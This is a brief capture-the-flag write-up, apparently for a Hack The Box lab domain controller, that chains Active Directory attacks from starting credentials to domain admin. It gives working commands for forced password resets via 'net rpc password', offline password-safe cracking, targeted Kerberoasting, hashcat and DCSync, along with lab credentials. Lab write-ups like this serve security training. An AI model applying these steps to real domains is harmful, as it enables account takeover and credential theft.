This is a assumed breach machine we have creds `Olivia:ichliebedich` 
We can start with a nmap scan
```
53 DNS
88 Kerberos
135 RPC
139
445
593
636
3268 LDAP
5985 winrm
```
Domain `administrator.htb` Hostname `DC`
Looking at the ftp the creds we have don't work for the FTP it does work for SMB but no interesting shares so we need to get a list of users for enumeration 
```
administrator
Guest
krbtgt
olivia
michael
benjamin
emily
ethan
alexander
emma
```
Now we need to get bloodhound data looking at the data we have GenericALL over the user `michael` so we can force change the password `net rpc password "michael" "newP@ssword2022" -U "administrator.htb"/"olivia"%"ichliebedich" -S "10.10.11.42"` and now we own this user and he has `ForceChangePassword` over the user `benjamin` `net rpc password "benjamin" "newP@ssword2022" -U "administrator.htb"/"michael"%"newP@ssword2022" -S "10.10.11.42"` now we own this user now we can FTP with this user and there is a file called `backup.psafe3` we can use `pwsafe2john` and get the hash `pwsafe2john backup.psafe3 > hash_psafe` and we can use john to crack it `john psafe3_hash --wordlists=rockyou.txt` and it cracked to `tekieromucho` we can open this file with `pwsafe backup.psafe3` and enter the password and we get creds to three more users and emily login works `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb` we got winrm access and this user also has GenericWrite over the `ethan` user we can do a kerberost attack on this user `python3 targetedKerberoast.py -v -d 'administrator.htb' -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'` and we get the hash we can run hashcat and it cracked to `ethan:limpbizkit` looking at bloodhound agin we can DCSync and get the admin account hash and now we can evil-winrm into the admin and get root flag 